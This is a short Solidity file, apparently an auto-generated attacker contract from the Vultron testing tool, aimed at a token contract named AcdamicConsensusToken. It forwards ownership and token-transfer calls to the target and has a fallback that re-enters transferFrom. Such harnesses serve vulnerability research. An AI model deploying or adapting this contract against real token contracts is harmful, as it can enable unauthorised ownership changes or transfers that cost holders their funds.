pragma solidity ^0.4.19;

import "/home/osboxes/Develop/vultron/contracts/AcdamicConsensusToken.sol";

contract Attack_AcdamicConsensusToken3 {

  AcdamicConsensusToken public target_contract;

  function Attack_AcdamicConsensusToken3(address _targetContract) public payable {
      target_contract = AcdamicConsensusToken(_targetContract);
  } 

  function vultron_transferOwnership(address newOwner) public {
    target_contract.transferOwnership(newOwner);
  } 

  function vultron_transfer(address _to, uint256 _value) public {
    target_contract.transfer(_to, _value);
  } 

  function vultron_push(address _buyer, uint256 _amount) public {
    target_contract.push(_buyer, _amount);
  } 

  function vultron_approve(address _spender, uint256 _value) public {
    target_contract.approve(_spender, _value);
  } 

  function vultron_transferFrom(address _from, address _to, uint256 _value) public {
    target_contract.transferFrom(_from, _to, _value);
  } 

  function() public payable {
    target_contract.transferFrom(this,  this,  10000);
  }
} 
